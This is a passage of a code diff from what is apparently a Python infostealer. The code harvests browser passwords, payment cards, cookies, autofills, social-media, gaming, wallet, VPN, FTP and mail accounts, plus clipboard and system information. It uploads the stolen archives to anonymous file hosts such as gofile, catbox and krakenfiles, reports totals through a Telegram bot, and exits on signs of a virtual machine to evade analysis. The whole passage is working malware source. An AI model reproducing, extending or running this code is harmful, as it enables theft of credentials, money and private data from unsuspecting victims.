-<b>Cookies:</b> <code>{str(len(ListFonction.Cookies))}</code>
-<b>Autofills:</b> <code>{str(len(ListFonction.Autofills))}</code>
+<b>Cards:</b>\t<code>{str(len(ListFonction.Cards))}</code>
+<b>Passwords:</b>\t<code>{str(len(ListFonction.Passwords))}</code>
+<b>Cookies:</b>\t<code>{str(len(ListFonction.Cookies))}</code>
+<b>Autofills:</b>\t<code>{str(len(ListFonction.Autofills))}</code>
 
 <b><i><u>Social Media</u></i></b>
-<b>Reddit:</b> <code>{str(len(ListFonction.RedditAccounts))}</code>
-<b>Instagram:</b> <code>{str(len(ListFonction.InstagramAccounts))}</code>
-<b>Guilded:</b> <code>{str(len(ListFonction.GuildedAccounts))}</code>
-<b>Patreon:</b> <code>{str(len(ListFonction.PatreonAccounts))}</code>
-<b>Spotify:</b> <code>{str(len(ListFonction.SpotifyAccount))}</code>
-<b>Twitch:</b> <code>{str(len(ListFonction.TwitchAccounts))}</code>
-<b>Twitter:</b> <code>{str(len(ListFonction.TwitterAccounts))}</code>
-<b>TikTok:</b> <code>{str(len(ListFonction.TikTokAccounts))}</code>
-<b>RiotUser</b> <code>{str(len(ListFonction.RiotUserAccounts))}</code>
-<b>Roblox</b> <code>{str(len(ListFonction.RobloxAccounts))}</code>
+<b>Reddit:</b>\t<code>{str(len(ListFonction.RedditAccounts))}</code>
+<b>Instagram:</b>\t<code>{str(len(ListFonction.InstagramAccounts))}</code>
+<b>Guilded:</b>\t<code>{str(len(ListFonction.GuildedAccounts))}</code>
+<b>Patreon:</b>\t<code>{str(len(ListFonction.PatreonAccounts))}</code>
+<b>Spotify:</b>\t<code>{str(len(ListFonction.SpotifyAccount))}</code>
+<b>Twitch:</b>\t<code>{str(len(ListFonction.TwitchAccounts))}</code>
+<b>Twitter:</b>\t<code>{str(len(ListFonction.TwitterAccounts))}</code>
+<b>TikTok:</b>\t<code>{str(len(ListFonction.TikTokAccounts))}</code>
+<b>RiotUser:</b>\t<code>{str(len(ListFonction.RiotUserAccounts))}</code>
+<b>Roblox:</b>\t<code>{str(len(ListFonction.RobloxAccounts))}</code>
 
-<b><i><u>Messenger</u></i></b>
-<b>Discord</b> <code>{str(len(ListFonction.DiscordAccounts))}</code>
-<b>SteamUser</b> <code>{str(len(ListFonction.SteamUserAccounts))}</code>
+<b><i><u>Other</u></i></b>
+<b>Messenger:</b>\t<code>{str(len(ListFonction.Messengers))}</code>
+<b>VPN:</b>\t<code>{str(len(ListFonction.VpnsCounts))}</code>
+<b>FTP Client:</b>\t<code>{str(len(ListFonction.FtpClient))}</code>
+<b>Games:</b>\t<code>{str(len(ListFonction.GamesCounts))}</code>
+<b>Mail:</b>\t<code>{str(len(ListFonction.MailsCounts))}</code>
+<b>Wallets:</b>\t<code>{str(len(ListFonction.WalletsCounts))}</code>
+<b>Password Manager:</b>\t<code>{str(len(ListFonction.PasswordManager))}</code>
 """
 
             send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
@@ -2342,17 +2397,15 @@ class get_data:
                     async with aiohttp.ClientSession() as session:
                         async with session.post(send, data=message_payload) as response:
                             pass
-
             try:
-
                 os.remove(filePath + ".zip")
                 shutil.rmtree(filePath)
 
-            except Exception:
-                await error_handler()
+            except Exception as e:
+                error_handler(f"remove all files zip error - {str(e)}")
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"send all data error - {str(e)}")
         
 
 class UploadFiles:
@@ -2363,8 +2416,8 @@ class UploadFiles:
                 async with session.get("https://api.gofile.io/getServer") as request:
                     data = await request.json()
                     return data["data"]["server"]
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"gofile server error - {str(e)}")
             return "store1"
 
     @staticmethod
@@ -2376,12 +2429,11 @@ class UploadFiles:
                 with open(path, 'rb') as file:
                     form = aiohttp.FormData()
                     form.add_field('file', file, filename=os.path.basename(path))
-
                     async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
                         data = await response.json()
                         return data["data"]["downloadPage"]
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"gofile error - {str(e)}")
             return None
 
     @staticmethod
@@ -2393,12 +2445,11 @@ class UploadFiles:
                     form.add_field('fileToUpload', file, filename=os.path.basename(path))
                     form.add_field('reqtype', 'fileupload')
                     form.add_field('userhash', '')
-
                     async with session.post('https://catbox.moe/user/api.php', data=form) as response:
                         result = await response.text()
                         return result
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"catbox error - {str(e)}")
             return None
 
     @staticmethod
@@ -2408,16 +2459,14 @@ class UploadFiles:
                 with open(path, 'rb') as file:
                     form = aiohttp.FormData()
                     form.add_field('file', file, filename=os.path.basename(path))
-
                     async with session.post('https://file.io/', data=form) as response:
                         if response.status == 200:
                             data = await response.json()
                             return data.get("link")
                         else:
-                            await error_handler()
                             return None
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"fileio error - {str(e)}")
             return None
 
     @staticmethod
@@ -2427,37 +2476,35 @@ class UploadFiles:
                 with open(path, 'rb') as file:
                     form = aiohttp.FormData()
                     form.add_field('file', file, filename=os.path.basename(path))
-
                     async with session.post('https://uguu.se/api.php?d=upload', data=form) as response:
                         data = await response.json()
                         return data.get("url")
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"uguu error - {str(e)}")
             return None
 
     @staticmethod
-    async def upload_anonfiles(path: str) -> str:
+    async def upload_krakenfiles(path: str) -> str:
         try:
             async with aiohttp.ClientSession() as session:
                 with open(path, 'rb') as file:
                     form = aiohttp.FormData()
                     form.add_field('file', file, filename=os.path.basename(path))
-
-                    async with session.post('https://api.anonfiles.com/upload', data=form) as response:
+                    async with session.post('https://krakenfiles.com/api/v1/file/upload', data=form) as response:
                         data = await response.json()
-                        return data["data"]["file"]["url"]["full"]
-        except Exception:
-            await error_handler()
+                        return data["data"]["file"]["url"]
+        except Exception as e:
+            error_handler(f"krakenfiles error - {str(e)}")
             return None
 
     @staticmethod
     async def upload_file(file_path: str) -> str:
         upload_attempts = [
-            ('Catbox', UploadFiles.upload_catbox),
-            ('File.io', UploadFiles.upload_fileio),
             ('GoFile', UploadFiles.upload_gofile),
+            ('File.io', UploadFiles.upload_fileio),
+            ('Catbox', UploadFiles.upload_catbox),
             ('Uguu', UploadFiles.upload_uguu),
-            ('AnonFiles', UploadFiles.upload_anonfiles),
+            ('KrakenFiles', UploadFiles.upload_krakenfiles),
         ]
         
         for platform, upload_method in upload_attempts:
@@ -2465,8 +2512,8 @@ class UploadFiles:
                 result = await upload_method(file_path)
                 if result:
                     return result
-            except Exception:
-                await error_handler()
+            except Exception as e:
+                error_handler(f"upload file attempts error - {str(e)}")
                 continue
         
         return "All upload attempts failed."
@@ -2489,7 +2536,7 @@ class InfoStealer:
         process = await asyncio.create_subprocess_shell(command,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
         stdout, stderr = await process.communicate()
         if stderr:
-            await error_handler()
+            error_handler(f"get command error")
         return stdout.decode(errors="ignore")
 
     async def StealLastClipBoard(self) -> None:
@@ -2497,8 +2544,8 @@ class InfoStealer:
             output = await self.get_command_output("powershell.exe Get-Clipboard")
             if output:
                 ListFonction.ClipBoard.append(output)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"clipboard error - {str(e)}")
 
     async def StealNetworkInformation(self) -> None:
         try:
@@ -2511,43 +2558,41 @@ class InfoStealer:
                     timezone = data["timezone"]
                     isp_info = data["isp"] + f" {data['org']} {data['as']}"
                     ListFonction.Network.append(f"IP: {ip}\nCountry: {country}\nCity: {city}\nTimezone: {timezone}\nISP: {isp_info}")
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"network error - {str(e)}")
 
     async def StealInstalledSoftware(self) -> None:
         try:
             output = await self.get_command_output("powershell.exe Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version | ConvertTo-Json")
             software_list = json.loads(output)
             ListFonction.InstalledSoftware.extend([f"Name: {software['Name']}, Version: {software['Version']}" for software in software_list])
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"installed softwares error - {str(e)}")
 
     async def StealProcesses(self) -> None:
         try:
             output = await self.get_command_output("powershell.exe Get-Process | Select-Object -Property Name, Id | ConvertTo-Json")
             processes_list = json.loads(output)
             ListFonction.Processes.extend([f"Name: {process['Name']}, Id: {process['Id']}" for process in processes_list])
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"processes error - {str(e)}")
 
     async def StealTasks(self) -> None:
         try:
             output = await self.get_command_output("powershell.exe Get-ScheduledTask | Select-Object -Property TaskName | ConvertTo-Json")
             tasks_list = json.loads(output)
             ListFonction.TasksList.extend([f"TaskName: {task['TaskName']}" for task in tasks_list])
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"tasks error - {str(e)}")
 
     async def StealSystemInfo(self) -> None:
         try:
-            output = await self.get_command_output("powershell.exe Get-ComputerInfo | ConvertTo-Json")
-            system_info = json.loads(output)
-            ListFonction.SystemInfo.append(f"OS: {system_info['WindowsVersion']}, Architecture: {system_info['ArchitectureType']}")
-        except Exception:
-            await error_handler()
-
-
-
+            command = r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername'
+            output = await self.get_command_output(command)
+            ListFonction.SystemInfo.append(output)
+        except Exception as e:
+            error_handler(f"system infos error - {str(e)}")
+            pass
 
 class anti_vm:
     async def run_all_fonctions(self) -> None:
@@ -2562,8 +2607,8 @@ class anti_vm:
         ]
         try:
             await asyncio.gather(*tasks)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"send all anti vm error - {str(e)}")
 
     async def check_disk_space(self) -> bool:
         try:
@@ -2576,31 +2621,31 @@ class anti_vm:
             free_space_gb = win32api.GetDiskFreeSpaceEx()[1] / 1073741824
             if free_space_gb < min_disk_space_gb:
                 ctypes.windll.kernel32.ExitProcess(0)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"anti vm disk space error - {str(e)}")
 
     async def check_recent_files(self) -> bool:
         try:
             recent_files_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
             if len(os.listdir(recent_files_folder)) < 20:
                 ctypes.windll.kernel32.ExitProcess(0)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"check recent files error - {str(e)}")
 
     async def check_process_count(self) -> None:
         try:
             if len(psutil.pids()) < 50:
                 ctypes.windll.kernel32.ExitProcess(0)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"process count error - {str(e)}")
 
     async def check_virtual_memory(self) -> None:
         try:
             total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
             if total_memory_gb < 6:
                 ctypes.windll.kernel32.ExitProcess(0)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"virtual memory error - {str(e)}")
 
     async def check_for_virtualization(self) -> None:
         try:
@@ -2609,8 +2654,8 @@ class anti_vm:
             video_controller_info = stdout.decode(errors='ignore').splitlines()
             if any(x.lower() in video_controller_info[2].strip().lower() for x in ("virtualbox", "vmware")):
                 ctypes.windll.kernel32.ExitProcess(0)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"virtualization error - {str(e)}")
 
     async def check_for_suspicious_files(self) -> None:
         try:
@@ -2632,8 +2677,8 @@ class anti_vm:
             ]
             if running_processes:
                 ctypes.windll.kernel32.ExitProcess(0)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"sus files error - {str(e)}")
 
     async def check_system_manufacturer(self) -> None:
         try:
@@ -2645,8 +2690,9 @@ class anti_vm:
 
             if b'VMware' in stdout1 or b"vmware" in stdout2.lower():
                 ctypes.windll.kernel32.ExitProcess(0)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"manufacturer error - {str(e)}")
+
 
         
 if __name__ == '__main__':
